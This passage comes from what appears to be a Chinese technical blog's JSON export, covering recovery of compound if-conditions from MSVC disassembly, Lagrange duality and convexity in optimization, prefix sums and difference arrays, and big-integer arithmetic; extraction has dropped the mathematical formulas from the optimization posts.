EXIT_PROGRAM.text:00401049 cmp [ebp+argc], 2.text:0040104D jle short EXIT_PROGRAM.text:0040104F push offset _Format ; &quot;argv != nullptr &amp;&amp; argc &gt; 2\\n&quot;.text:00401054 call _printf.text:00401059 add esp, 4.text:0040105C.text:0040105C EXIT_PROGRAM: ; CODE XREF: _main+7↑j.text:0040105C ; _main+D↑j.text:0040105C xor eax, eax.text:0040105E pop ebp.text:0040105F retn.text:0040105F _main endp 可以观察到，对于多个jcc指令后面的标号都有一个统一的标号。这个特点符合逻辑运算的性质，即：对于用与运算连接的逻辑表达式而言，如果一个条件为假，则整个表达式为假。因此jcc后面的标号是退出条件体的标号，而退出标号和最后一条jcc指令之间的代码则是条件体内的代码。 还原方法则是： 将jcc的各个条件取反 将各个条件使用&amp;&amp;进行组合 还原条件体内的代码即可 或条件测试代码： 123456int main(int argc, char** argv) &#123; if (argv != nullptr || argc &gt; 2) &#123; printf(&quot;argv != nullptr || argc &gt; 2\\n&quot;); &#125; return 0;&#125; VS2019的MSVC下的反汇编结果： 1234567891011121314151617181920212223242526.text:00401040 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401040 _main proc near ; CODE XREF: __scrt_common_main_seh+F5↓p.text:00401040.text:00401040 argc = dword ptr 8.text:00401040 argv = dword ptr 0Ch.text:00401040 envp = dword ptr 10h.text:00401040.text:00401040 push ebp.text:00401041 mov ebp, esp.text:00401043.text:00401043 IF_BEGIN:.text:00401043 cmp [ebp+argv], 0.text:00401047 jnz short IF_BODY.text:00401049 cmp [ebp+argc], 2.text:0040104D jle short EXIT_PROGRAM.text:0040104F.text:0040104F IF_BODY: ; CODE XREF: _main+7↑j.text:0040104F push offset _Format ; &quot;argv != nullptr || argc &gt; 2\\n&quot;.text:00401054 call _printf.text:00401059 add esp, 4.text:0040105C.text:0040105C EXIT_PROGRAM: ; CODE XREF: _main+D↑j.text:0040105C xor eax, eax.text:0040105E pop ebp.text:0040105F retn.text:0040105F _main endp 可以发现，其代码特征是： 除了最后一个jcc外，后面的标号都是指向同一个条件体内的代码块的起始位置 最后一个jcc后的标号为退出条件体的代码块的起始位置 上述代码特征符合或运算的逻辑表达式性质：对于用或连接的逻辑表达式而言，如果一个条件成立，整个表达式为真。 还原时，只需要： 除了最后一个jcc的条件需要取反以外，其余的jcc条件都不取反 使用或运算连接各个条件 还原条件体内的代码 与运算和或运算的组合对于组合的情况，其会将各种优化手段用上，我们需要做的就是去掉这些优化，来还原代码。 测试代码： 12345678910111213int main(int argc, char **argv) &#123; if (argv != nullptr &amp;&amp; argc != 1) &#123; printf(&quot;%d\\n&quot;, argc + 1); &#125; else if (argc == 2 || argc == *(int*)(*argv)) &#123; printf(&quot;argv is not nullptr and argc == argv&quot;); &#125; else &#123; printf(&quot;%p\\n&quot;, argv); &#125; return 0;&#125; VS2019的MSVC下的反汇编结果： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051.text:00401040 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401040 _main proc near ; CODE XREF: __scrt_common_main_seh+F5↓p.text:00401040.text:00401040 argc = dword ptr 8.text:00401040 argv = dword ptr 0Ch.text:00401040 envp = dword ptr 10h.text:00401040.text:00401040 push ebp.text:00401041 mov ebp, esp.text:00401043 mov edx, [ebp+argv].text:00401046 mov ecx, [ebp+argc].text:00401049 test edx, edx.text:0040104B jz short loc_401067.text:0040104D cmp ecx, 1.text:00401050 jz short loc_40106C.text:00401052 lea eax, [ecx+1].text:00401055 push eax.text:00401056 push offset _Format ; &quot;%d\\n&quot;.text:0040105B call _printf.text:00401060 add esp, 8.text:00401063 xor eax, eax.text:00401065 pop ebp.text:00401066 retn.text:00401067 ; ---------------------------------------------------------------------------.text:00401067.text:00401067 loc_401067: ; CODE XREF: _main+B↑j.text:00401067 cmp ecx, 2.text:0040106A jz short loc_401084.text:0040106C.text:0040106C loc_40106C: ; CODE XREF: _main+10↑j.text:0040106C mov eax, [edx].text:0040106E cmp ecx, [eax].text:00401070 jz short loc_401084.text:00401072 push edx.text:00401073 push offset aP ; &quot;%p\\n&quot;.text:00401078 call _printf.text:0040107D add esp, 8.text:00401080 xor eax, eax.text:00401082 pop ebp.text:00401083 retn.text:00401084 ; ---------------------------------------------------------------------------.text:00401084.text:00401084 loc_401084: ; CODE XREF: _main+2A↑j.text:00401084 ; _main+30↑j.text:00401084 push offset aArgvIsNotNullp ; &quot;argv is not nullptr and argc == argv&quot;.text:00401089 call _printf.text:0040108E add esp, 4.text:00401091 xor eax, eax.text:00401093 pop ebp.text:00401094 retn.text:00401094 _main endp 可以观察到上面的反汇编结果好像与上面分析的没有几个是一样的，怎么办呢？一点点的看。首先观察第一个部分： 1234567891011121314.text:00401043 mov edx, [ebp+argv].text:00401046 mov ecx, [ebp+argc].text:00401049 test edx, edx.text:0040104B jz short loc_401067.text:0040104D cmp ecx, 1.text:00401050 jz short loc_40106C.text:00401052 lea eax, [ecx+1].text:00401055 push eax.text:00401056 push offset _Format ; &quot;%d\\n&quot;.text:0040105B call _printf.text:00401060 add esp, 8.text:00401063 xor eax, eax.text:00401065 pop ebp.text:00401066 retn 可以发现其既不像与运算连接的条件（没有统一的退出标号）也不像或运算连接的条件（没有统一的入口标号），所以需要模拟执行。模拟执行后可以发现test edx, edx和cmp ecx, 1是与条件，因为只有他们两个都不成立的情况下，才能执行条件体内的代码。继续向下查看： 12345678910111213141516171819202122232425.text:00401067 loc_401067: ; test edx, edx jz short loc_401067 edx == argv.text:00401067 cmp ecx, 2.text:0040106A jz short ELSE_BEGIN.text:0040106C.text:0040106C loc_40106C: ; cmp ecx, 1 jz short loc_40106C ecx == argc.text:0040106C mov eax, [edx].text:0040106E cmp ecx, [eax].text:00401070 jz short ELSE_BEGIN.text:00401072 push edx.text:00401073 push offset aP ; &quot;%p\\n&quot;.text:00401078 call _printf.text:0040107D add esp, 8.text:00401080 xor eax, eax.text:00401082 pop ebp.text:00401083 retn.text:00401084 ; ---------------------------------------------------------------------------.text:00401084.text:00401084 ELSE_BEGIN: ; CODE XREF: _main+2A↑j.text:00401084 ; _main+30↑j.text:00401084 push offset aArgvIsNotNullp ; &quot;argv is not nullptr and argc == argv&quot;.text:00401089 call _printf.text:0040108E add esp, 4.text:00401091 xor eax, eax.text:00401093 pop ebp.text:00401094 retn 这块代码块好像与条件的特征，但是它真的是吗？如果是与条件相连接的话，它们就应该是一个整体，条件判断的入口应该都是标号loc_401067的位置。虽然它们都有统一的退出出口，但是进入这个条件的入口却不是相同的，因此这两个条件判断不是与运算连接的。那么它们是什么呢？需要模拟执行一下。当两个条件各自成立时，发现有共同的入口，符合用或条件连接的代码特征，且与上面的判断条件有多个入口逻辑上可以解释的通顺，则可以判定其为或条件连接的代码特征。 综上，可以还原出代码： 1234567891011121314int __cdecl main(int argc, const char **argv, const char **envp) &#123; if (argv != nullptr &amp;&amp; argc != 1) &#123; printf(&quot;%d\\n&quot;, argc + 1); return 0; &#125; if (argc == 2 || argc == *(int*)argv) &#123; printf(&quot;argv is not nullptr and argc == argv&quot;); return 0; &#125; printf(&quot;%p\\n&quot;, argv); return 0;&#125; 分析还原出来的代码和源代码进行比较，发现其在逻辑上是等价的，故还原的没有问题。","categories":[{"name":"C/C++逆向","slug":"C-C-逆向","permalink":"https://4st.tech/categories/C-C-%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"https://4st.tech/tags/%E9%80%86%E5%90%91/"},{"name":"选择结构","slug":"选择结构","permalink":"https://4st.tech/tags/%E9%80%89%E6%8B%A9%E7%BB%93%E6%9E%84/"},{"name":"分支结构","slug":"分支结构","permalink":"https://4st.tech/tags/%E5%88%86%E6%94%AF%E7%BB%93%E6%9E%84/"},{"name":"条件转移","slug":"条件转移","permalink":"https://4st.tech/tags/%E6%9D%A1%E4%BB%B6%E8%BD%AC%E7%A7%BB/"},{"name":"if","slug":"if","permalink":"https://4st.tech/tags/if/"},{"name":"else if","slug":"else-if","permalink":"https://4st.tech/tags/else-if/"},{"name":"if...else","slug":"if-else","permalink":"https://4st.tech/tags/if-else/"}]},{"title":"机器学习：凸优化中的对偶","slug":"机器学习：凸优化中的对偶","date":"2021-08-18T06:34:47.000Z","updated":"2021-08-18T06:58:47.042Z","comments":true,"path":"2021/08/18/ji-qi-xue-xi-tu-you-hua-zhong-de-dui-ou/","link":"","permalink":"https://4st.tech/2021/08/18/ji-qi-xue-xi-tu-you-hua-zhong-de-dui-ou/","excerpt":"","text":"涉及到的知识点 Lower bound property Strong and Weak Duality Complementary Slackness KKT Conditions 对于KKT Conditions，把它放到了SVM中去讲解，本文不再赘述。 Primal Problem &amp; Dual Problem 原始问题（Primal Problem）和对偶问题（Dual Problem）是对一个问题的不同角度上的理解，任何一个原始问题都可以转换为与之对应的对偶问题。 举个例子，就像初中时学过的三视图一样，你从正面观察得到的正视图是一个样子，从侧面观察的左视图和从上面观察的俯视图是另外一个样子。根据这些不同的视图就可以唯一确定出来这个物体的立体形状。 原始问题就相当于是从正面、左侧面和上面俯视得到的三视图；而对偶问题就相当于从背面、下面和右侧面观察得到的三视图，它们是同一问题的从不同方面的表述。 根据上述的举例，可以直观的感觉出来：任何一个原始问题从原则上来讲，都可以将其转换为与之对应的对偶问题，然后求解这个对偶问题得出来的解经过一些调整来得到原始问题的解。上述表述在凸优化中就对应着拉格朗日对偶问题。 拉格朗日对偶问题 一般优化问题的标准形式转为对偶问题 将给定一般优化问题的标准形式： 转为拉格朗日函数的形式： 最后将拉格朗日函数的形式转为对应的拉格朗日对偶函数： 其中。上述拉格朗日对偶函数为什么只有两个参数了呢？因为是将取得最小值时对应的自变量的取值代入进去，所得到的一个函数式子。此时的均为常量了，因此上式中只有两个参数，且为一个仿射函数。 拉格朗日对偶函数 根据上述描述，可以得知拉格朗日对偶函数是一个仿射函数，而任何一个仿射函数既是凸函数又是凹函数，所以可以将任意的标准形式的优化问题转换为与之对应的拉格朗日对偶函数问题。 Lower Bound Property 设是原始问题的最优解，其函数值记为，则对于任意的，有：，即：原始问题的最优解所对应的函数值是拉格朗日对偶函数的上确界。 可以将上述的性质理解为：拉格朗日对偶函数的函数值不会超过原始问题的最优解所对应的函数值。为什么这样说呢？上述性质是怎样来的呢？应该给出证明。设是任意一个可行解，，，有： 又根据下确界的定义（可以将下确界从效果上大致理解为最小值，虽然它两个还有细微的差别，但是可以直观上这么理解，可以暂时将其理解为最小值定义），得到： 将上述不等式联立起来，即可得到：。即：对于任意一个可行解，拉格朗日的最大值都不会超过原始问题的函数值。所以将换为最优解后，命题得证。 根据Lower Bound Property，求解原始问题的最优解，其实就是相当于求解拉格朗日对偶问题的最大值。由于对于仿射函数，它既是凸函数又是凹函数，所以我们倾向于将仿射函数看做是一个凹函数（因为大多数情况下都是凹函数求最大值，凸函数求最小值）。 所以**拉格朗日对偶函数构成了原始问题的最优点的函数值的下界。**而其最好的解就是与原始问题的最优解的函数值是相等的，但是也可能不会相等，那么什么时候相等，什么时候又不相等呢？这就需要一个新的判断标准，这就涉及到了Strong and Weak Duality. Strong and Weak Duality 设是Primal Optimal，是Dual Optimal，则： 是一定成立的 是不一定成立的 对于称为强对偶性（Strong Duality），而称为弱对偶性（Weak Duality）。对于强对偶性来说： 一般情况下是不成立的 在凸函数下一般会成立 对于非凸函数来说，有时候会成立 对于强对偶性成立的优化问题来说，求得对偶问题的最优解后，不用再做调整，可以直接作为原问题的最优解来使用；而对于弱对偶性来说，还需要对对偶问题的解做一系列调整才能用作原问题的解。 那么到底什么时候，具有强对偶性呢？需要满足Slater’s Conditions. Slater’s Conditons 对于一般优化问题的标准形式而言： 如果存在可行解，使得严格小于0成立，严格成立，*这个条件称为Slater条件*。 Slater定理 - 用来判断强对偶性是否成立 如果原始问题（Primal Problem）是凸优化问题，且Slater条件成立，则强对偶性成立。即：它描述的是：当Slater条件成立且原问题是凸优化问题时，强对偶性成立。 Complementary Slackness 假设强对偶性成立（Strong Duality），是Primal Optimal，是Dual Optimal，根据Lower Bound Property有： 即：。而要想左式成立，则必须要有。又因为对于来说，每一项都是非正的，所有等价于 也就是说：当强对偶性成立时，是原问题的最优解，如果是对偶问题的最优解的必须满足的必要条件（上述的条件）称为互补松弛条件。","categories":[{"name":"机器学习","slug":"机器学习","permalink":"https://4st.tech/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"对偶","slug":"对偶","permalink":"https://4st.tech/tags/%E5%AF%B9%E5%81%B6/"},{"name":"拉格朗日对偶","slug":"拉格朗日对偶","permalink":"https://4st.tech/tags/%E6%8B%89%E6%A0%BC%E6%9C%97%E6%97%A5%E5%AF%B9%E5%81%B6/"},{"name":"互补松弛条件","slug":"互补松弛条件","permalink":"https://4st.tech/tags/%E4%BA%92%E8%A1%A5%E6%9D%BE%E5%BC%9B%E6%9D%A1%E4%BB%B6/"},{"name":"强对偶性","slug":"强对偶性","permalink":"https://4st.tech/tags/%E5%BC%BA%E5%AF%B9%E5%81%B6%E6%80%A7/"},{"name":"弱对偶性","slug":"弱对偶性","permalink":"https://4st.tech/tags/%E5%BC%B1%E5%AF%B9%E5%81%B6%E6%80%A7/"},{"name":"Duality","slug":"Duality","permalink":"https://4st.tech/tags/Duality/"},{"name":"Lower bound property","slug":"Lower-bound-property","permalink":"https://4st.tech/tags/Lower-bound-property/"},{"name":"Strong and Weak Duality","slug":"Strong-and-Weak-Duality","permalink":"https://4st.tech/tags/Strong-and-Weak-Duality/"},{"name":"Complementary Slackness","slug":"Complementary-Slackness","permalink":"https://4st.tech/tags/Complementary-Slackness/"},{"name":"KKT Conditions","slug":"KKT-Conditions","permalink":"https://4st.tech/tags/KKT-Conditions/"}]},{"title":"机器学习：凸集和凸函数","slug":"机器学习：凸集和凸函数","date":"2021-08-14T09:34:13.000Z","updated":"2021-08-14T12:44:19.162Z","comments":true,"path":"2021/08/14/ji-qi-xue-xi-tu-ji-he-tu-han-shu/","link":"","permalink":"https://4st.tech/2021/08/14/ji-qi-xue-xi-tu-ji-he-tu-han-shu/","excerpt":"","text":"优化 一般优化问题 机器学习中的问题基本上都是优化问题。那么什么是优化问题呢： 构造一个合适的目标函数，使得这个目标函数取到极值时的解就是你要求的东西 找到一个能让这个目标函数取到极值的解的方法 即机器学习 = 模型 + 优化，其中模型就是我们要求解的目标；优化就是能够求解这个目标的方法。 将上述的概念可以类比数据结构和算法的关系。我们知道程序 = 数据结构 + 算法，数据结构是研究数据如何在计算机中组织和存储的；而算法是在这些数据结构之上的操作。有了这两方面的东西，才有了我们的程序，这与机器学习 = 模型 + 优化的概念基本上是一致的。 任何一个优化问题，都可以写为： 其中就是我们要求解的目标函数，是目标函数的约束条件，满足这些约束条件的点叫做可行解（Feasible Solution）。我们要做的就是在可行解集中找到一个解，使得目标函数取得最小值，这个解称为最优解。 上述的优化问题的写法是一般优化问题的标准形式，在这个标准形式中，没有做出任何假设，即：没有对这个目标函数做任何的假设，也没有假设目标函数所受到的约束条件中的函数是什么类型的函数。它们可以是凸函数也可以是非凸函数、可以是连续的函数也可以是离散的函数等等。 优化的分类 有了优化问题的标准形式之后，就需要判断优化目标——目标函数它属于什么类别。因为对于不同的类别有不同的处理方法。 在优化领域通常会将优化问题分为四个方面： 凸的和非凸的 光滑和非光滑 连续和离散 有约束条件和无约束条件 机器学习主要关注的是凸优化问题。因为凸优化问题有一个很好的性质，就是：局部最优解就是全局最优解；而对于非凸优化问题来说，局部最优解不一定就是全局最优解。所以对于非凸优化问题来说，我们追求的是找到更好的局部最优解（Better Local Optimal） 对于非凸优化问题来说，常常有以下三种解决方法： 如果非凸优化问题简单，可以硬解出来，如：Bruce Force 如果可以通过松弛Relax等方法，将非凸优化问题转为凸优化问题，来求解这个凸优化问题。当把这个凸优化问题求解完毕之后，对求解出来的凸优化问题的解来做一些改进得到非凸优化问题的解。 通过常规的算法进行求解，但是求解出来的一定是一个局部最优解（Local Optimal） 优化问题的通用解决思路 首先确定问题所涉及到的参数 Decision Variable 确定目标并写出目标函数 Objective Function 判断是否约束条件，如果有，将所有的约束条件写出来 Constraints 判断优化问题所属的分类，一般判断其是否是凸优化问题 Convex 使用或设计求解器Solver 凸优化问题 假设给定的优化问题是如下的标准形式： 那么什么样的问题是凸优化问题呢？即：给定一个标准形式的优化问题，如何判断它属不属于凸优化问题呢？ 要解决上述问题，就需要回归概念：需要关注目标函数的定义域和值域是什么样子的。 凸集 定义 定义：假设对于，并且对，均有，则集合是凸集。 上述定义描述的是什么意思呢？简单来说，就是集合中任意两点之间的直线段上的点都属于集合。怎么看出来的呢？利用控制变量法。当都给定了的时候，它们就是一个常量了，不会随着的变化而变化了。所以只有一个自变量，令，有： 根据上式，只有一个自变量，其表示的是一条直线；又因为自变量是属于闭区间的，当时，；当时，。所以上述式子表示的是在点之间的直线段上的所有点。而​它构成了一个新的向量，这个向量还有一个名字，叫做凸组合。 凸集的定义保证了：在这个集合中的任意一个加权凸组合后的点仍然在这个集合内，这个性质保证了在计算过程中不会出可行域。 一个重要定理 两个凸集的交集还是凸集。 这个定理是一个重要的定理，在掌握了常用的凸集之后，在判断一个优化问题的可行域是否是凸集时就简化了。因为优化问题的可行域是满足各个约束条件的点的集合，它是一个交集。所以如果构成这个可行域的满足各个约束条件的点的集合它是一个凸集，那么这个可行域也一定是一个凸集。 常见的凸集 所有的 所有的正数集合 范数 仿集：线性方程组的所有解 半空间 凸函数 定义 函数的定义域为凸集，对于定义域中任意的两点，函数满足：，则称该函数为凸函数。 上述定义描述的是什么呢？描述的是：过一个下凸函数上任意两点所作割线一定在这两点间的函数图象的上方。至于为什么是割线（直线段）的原因与凸集中如何看出来是直线段的方法是一样的， 不再赘述。 具体来看上述不等式（这个不等式又叫做琴生不等式），不等式两侧的是同一个值，也就是说对于给定的两点和给定的一个确定的值，其比较的是同一个位置上的割线上的函数值和下凸函数上的函数值的大小。随着不断改变，取遍上的所有值，其也就把割线上的所有点和与之对应的下凸函数上的函数值都比较了一遍，根据几何性质可以得到上述结果，即：凸函数上任意两点所做的割线一定在这两点间的函数图像的上方。 从函数定义域和值域的角度上来看：给定的函数的定义域是凸集；函数的值域也是一个凸集。 凸函数的一个重要性质 若干个凸函数的非负加权后，得到的新的函数仍然是一个凸函数，即：若干个凸函数的非负加权和仍然是一个凸函数（权值是非负数，即要求权值要大于等于0）。 凸函数的判别方法 判断凸函数的一阶条件——充要条件 设是可导的，则为凸函数，当且仅当对于成立且是凸集 上述一阶条件要验证： 定义域是凸集 对于，不等式成立 上述定理的证明可以使用泰勒公式来进行证明，上述公式描述的是：下凸函数在点的附近点y处的函数值不小于以点为切点的切线上的函数值。 判断凸函数的二阶条件 设是二阶可导的，则为凸函数，当且仅当对于成立且是凸集 上述二阶条件要验证： 定义域是凸集 对于，​是半正定的（Positive-semidefinit ，PSD） 对于二阶条件的证明可以使用带有拉格朗日余项的泰勒公式来进行证明。 补充知识点：半正定矩阵 半正定矩阵的定义 一个矩阵是半正定的定义是：对于任意的实非零向量，如果实对称矩阵满足，则矩阵是半正定矩阵。 判断一个矩阵是否是半正定矩阵 判断一个矩阵是半正定矩阵可以通过定义去判断，也可以使用一些判定条件来进行判断： 需要注意的是：对于半正定矩阵来说，顺序主子式非负并不能推出矩阵是半正定的，而应该将相应的条件改为所有的主子式非负（而不仅仅是顺序主子式非负）。 如果一个矩阵的所有特征值均不小于0，则该矩阵是半正定矩阵 半正定矩阵的性质 半正定矩阵的行列式是非负的； 两个半正定矩阵的和是半正定的； 非负实数与半正定矩阵的数乘矩阵是半正定的。","categories":[{"name":"机器学习","slug":"机器学习","permalink":"https://4st.tech/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"https://4st.tech/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"优化","slug":"优化","permalink":"https://4st.tech/tags/%E4%BC%98%E5%8C%96/"},{"name":"凸优化","slug":"凸优化","permalink":"https://4st.tech/tags/%E5%87%B8%E4%BC%98%E5%8C%96/"},{"name":"凸集","slug":"凸集","permalink":"https://4st.tech/tags/%E5%87%B8%E9%9B%86/"},{"name":"凸函数","slug":"凸函数","permalink":"https://4st.tech/tags/%E5%87%B8%E5%87%BD%E6%95%B0/"},{"name":"半正定矩阵","slug":"半正定矩阵","permalink":"https://4st.tech/tags/%E5%8D%8A%E6%AD%A3%E5%AE%9A%E7%9F%A9%E9%98%B5/"},{"name":"优化问题的解决思路","slug":"优化问题的解决思路","permalink":"https://4st.tech/tags/%E4%BC%98%E5%8C%96%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E5%86%B3%E6%80%9D%E8%B7%AF/"}]},{"title":"基础算法：前缀和与差分","slug":"基础算法：前缀和与差分","date":"2021-08-12T09:26:19.000Z","updated":"2021-08-14T03:58:02.636Z","comments":true,"path":"2021/08/12/ji-chu-suan-fa-qian-zhui-he-yu-chai-fen/","link":"","permalink":"https://4st.tech/2021/08/12/ji-chu-suan-fa-qian-zhui-he-yu-chai-fen/","excerpt":"","text":"前缀和与差分 设原数组为A，其中的第i个元素为，则前缀和数组的第i个位置的元素，即：前缀和数组中的第i个元素等于原数组中前i个（下标从1开始）的和。 这里需要注意的是：对于前缀和数组来说，下标一定要从1开始而不是从0开始。 有两个问题： 如何求前缀和数组中的第i个元素？ 前缀和数组中的元素是用来做什么用的？有什么作用？ 前缀和 一维数组的前缀和 求元素 将边界值设为0，则可以使用迭代公式：即可计算出来，其代码为： 123for (int i = 1; i &lt;= n; ++i) &#123; S[i] = S[i - 1] + A[i];&#125; 需要注意的是，如果使用上述公式来求元素的话，那么在输入阶段，原始数组的下标也要从0挪到从1开始。 前缀和中的第0个元素为什么要设计成值为0，并且前缀和数组的下标是从1开始的？原因是为了统一操作，将求原数组中某一区间内的元素和的公式统一，不用处理边界值，不用再进行条件判断而设置的哨兵节点。 前缀和的作用 可以快速的求出原数组中一段元素的和，如：求[l, r]范围内的元素的和，其值为：。 为什么值是上述公式呢？不要忘记前缀和数组中的元素的定义。它的定义原数组中，前i个元素的和。 二维数组的前缀和 求元素 对于二维数组的前缀和元素表示的是：左上角部分的那一块子矩阵的元素的和。 如下图所示： 橘黄色部分的元素之和等于绿颜色矩形中的元素之和加上蓝颜色举行中的颜色之和减去重复运算的蓝绿矩形的交集中的元素之和，最后加上元素，即： 12345for (int i = 1; i &lt;= m; ++i) &#123; for (int j = 1; j &lt;= n; ++j) &#123; S[i][j] = S[i - 1][j] + S[i][j - 1] - S[i - 1][j - 1] + A[i][j]; &#125;&#125; 在记忆的时候，可以按照上述颜色的图形来记忆，也可以找参照物，即：使用子矩阵的右下角坐标为参照物，找上述颜色中的矩形是和它是同一行、前一行、同一列还是前一列。这样就可以快速写出上述公式了。 求给定区间范围内的元素之和 其实就是利用的集合的操作，给定两个坐标点​和​，则在这两个点内的矩阵的元素之和为： 其中： 代表的是左侧部分的长方形矩阵 代表的是上面部分的长方形矩阵 ​代表的是被重复减去的那一块正方形矩阵 快速写出上述求解公式的方法与求元素一致，以待求子矩阵的左上角坐标和右下角坐标为参照物，找到参与运算的子矩阵元素是和这些坐标是同一行、同一列、前一行还是前一列即可快速写出。 差分 差分和前缀和是一组逆运算。设原数组A中的第i个元素为，需要构造一个数组B，使得数组A是数组B的前缀和数组，即：。B数组称为数组A的差分数组，A数组称为B数组的前缀和数组。 一维数组 差分数组的构造与更新 对于一维数组的差分是比较好构造的，设： 从而有： 假设原来的数组A中的元素都是0（不管实际中给定的数组A中的元素是否是0，我们都假设原来数组A中的元素都是0），则差分数组B中的元素应该都是0（因为这样才能满足差分数组的定义），这样自然而然的就不需要对差分数组进行初始化了。 将给定的数组A中的每一个元素视为要加的常数C，那么就可以定义一个插入操作： 1234void insert(int l, int r, int C) &#123; B[l] += C; B[r + 1] -= C;&#125; 则对应数组A的差分数组为：insert(i, i, A[i])，。转为代码为： 123for (int i = 1; i &lt;= n; ++i) &#123; insert(i, i, A[i]);&#125; 利用哨兵数组（假定原数组中的所有元素均为0，则差分数组中的元素均为0），将差分数组的初始化和对给定连续区间[l, r]内的原数组中的元素都加上常数C的操作统一起来，不用再做额外的操作。 即：利用哨兵技巧，不用考虑差分数组的构造而只需要将精力放到如何更新差分数组中的元素即可。 差分数组的应用 差分数组的性质是：只需要对B数组求一遍前缀和，就可以得到原数组。 如果对于原数组A中指定的连续区间[l, r]中的每一个元素都需要加上一个常数C，直接对原数组A进行操作的话需要的时间复杂度是O(n)的，而如果使用差分数组则可以将上述操作的时间复杂度降低为O(1)。 如何操作呢？只需要将元素加上一个常量C和上的元素减去一个C即可。根据差分数组的性质，如果只有一个，则在求原数组中的元素时，区间[l, n]上的所有元素都会加上C。只需要保证[r + 1, n]上的元素不变即可，那么只需要即可保证[r + 1, n]上的元素不变。这就相当于是把连续区间[l, r]上的原数组中的所有元素都加上了一个常数C 二维数组 一维数组是将给定的连续区间范围的原数组中的元素均加上一个常数C；而二维数组的操作是对于给定的子矩阵中的每一个元素均加上一个常数C 差分数组的构造与更新 根据一维差分数组的性质与更新方式，对于二维数组的差分数组也是一样的，对起始点加上一个常量C，以该点为起始点的右下角矩阵中的所有元素都加上常量C。所以，二维数组中的差分数组为了保证还是原数组A的差分数组，则需要进行一系列的调整。 根据上图所示，设：，则对于原数组A中给定待操作矩阵中每个元素加上常数C，等价于差分数组： 用代码表示的话则是： 123456void insert(int x1, int y1, int x2, int y2, int C) &#123; B[x1][y1] += C; B[x1][y2 + 1] -= C; B[x2 + 1][y1] -= C; B[x2 + 1][y2 + 1] += C;&#125; 二维差分数组的构造和一维差分数组的构造一样，利用哨兵，可以将差分数组的构造和更新的操作统一起来。构造二维差分数组的方法为： 1insert(i, j, i, j, a[i][j]); 该函数的作用是：起始点坐标到终点坐标的矩阵中的元素都加上常数C。所以在插入原数组时，其实就是在说：在当前坐标下，将原数组的元素a[i][j]视为常数C，使其满足以元素a[i][j]为其前缀和的差分性质。 在最后计算加和得到原矩阵时，使用的是计算前缀数组的方式来迭代计算的。也就是说要根据差分矩阵计算原矩阵，其实就是求前缀和的过程。所以需要使用二维数组求前缀和的方式来计算。","categories":[{"name":"算法","slug":"算法","permalink":"https://4st.tech/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"前缀和","slug":"前缀和","permalink":"https://4st.tech/tags/%E5%89%8D%E7%BC%80%E5%92%8C/"},{"name":"差分","slug":"差分","permalink":"https://4st.tech/tags/%E5%B7%AE%E5%88%86/"}]},{"title":"基础算法：高精度大整数运算","slug":"基础算法：高精度大整数运算","date":"2021-08-08T11:48:36.000Z","updated":"2021-08-13T09:00:05.905Z","comments":true,"path":"2021/08/08/ji-chu-suan-fa-gao-jing-du-da-zheng-shu-yun-suan/","link":"","permalink":"https://4st.tech/2021/08/08/ji-chu-suan-fa-gao-jing-du-da-zheng-shu-yun-suan/","excerpt":"","text":"高精度大整数运算 只针对C++来说，因为C++没有大整数类，而java具有大整数类，python的整数是无限位的 对于大数运算，一般有以下几种情况： 型，其中这两个的位数大概在 型，其中这两个的位数大概在 ，其中A的长度不超过，是一个小整数，不超过 型，两个都是超长的整数，但是面试时要让写的概率不大 型，两个都是超长的正数，面试时让写的概率不大 基本思想 大整数的存储 由于位数较多，一个int变量根本存放不下（可表示的最大整数是2147483647，共10位，并不能存放的下），所以可以使用数组来进行存放。 在使用数组存放的时候就有一个问题，采用小端方式还是大端方式存放，哪一个对要做的高精度整数运算更加方便呢？比较建议的是使用小端方式，即：低地址（数组下标0开始）存放个位，然后依次往后存放高位。 采用小端方式存放的原因是，在做运算时会有进位，如果从数组下标0开始依次存放大整数的个位的话，方便进位操作。因为可能会出现需要在高位补上额外的一个1，对于数组来说，在下标0处添加高位进位还需要将后面的数依次向后移动一个位置，降低了效率；而在最后面补上进位的话就方便许多，并不需要进行移位操作。 由于可能会出现混合运算，因此对于大整数的加减乘除都需要保证存储格式要一致。 大整数的运算 其实本质上就是模拟小学学过的竖式运算。 要注意，本专题讨论的大整数运算的前提是两个大整数都是非负数，即：。如果不都是非负数，则是输入输出的问题了。 大整数加法 竖式加法运算的步骤： 个位与个位相加，如果计算结果大于10，则向前进位，并对10取余（模），得到最终结果的个位应该存放的值 然后是十位与十位相加，并加上进位。如果计算结果大于10，继续向前进位，并对10取余，得到最终结果的十位应该存放的值 重复上述操作，直到计算完毕 观察上述计算步骤，其实是三个数在做加法：两个位置的数相加再加上进位得到结果。 大整数减法 竖式减法运算的步骤： 个位与个位相减，如果不够减，则向前借一位，即：被减数的个位 + 10 - 减数的个位；被减数的十位要减去1 然后轮到十位进行上述运算 重复上述操作，直到计算完毕 上述运算步骤其实是三个数在参与运算： 如果没有借位的话，则是，此时借位carry为0 如果有借位的话，则是，此时借位carry为10 因此，做大整数减法的话是要分两个步骤 如果A小于B，则计算。即，先交换做减法，后补上一个负号 如果A不小于B，则直接做减法即可 大整数乘法 与加减法的比较类似，只需要找到其中几个关键点： 进位的值等于 当前位的值 高位的值为 需要注意的是，它是用A的每一位整体乘以的B，所以要求B不能太大，int能存放的下才行。 大整数除法 前提是高精度的整数除以低精度的整数，与大整数乘法的要求差不多。 回顾除法的竖式计算，设余数为r，被除数为A，除数为b，商为q，则有：。简单的来说就是： 商等于高精度整数A的当前位加上余数乘以10除以除数。也就是列竖式中第二步中，高位的商求出来后，继续进行下一步的运算时的落式运算 求落式运算中，做完减法剩下来的余数的高位是多少 为了统一操作，高精度整数的加减乘除都使用哨兵，记初始状态的进位为0，从而可以省略了分支结构。 需要注意的是： 大整数除法是从高位开始的，而其他三种运算都是从低位开始做运算的 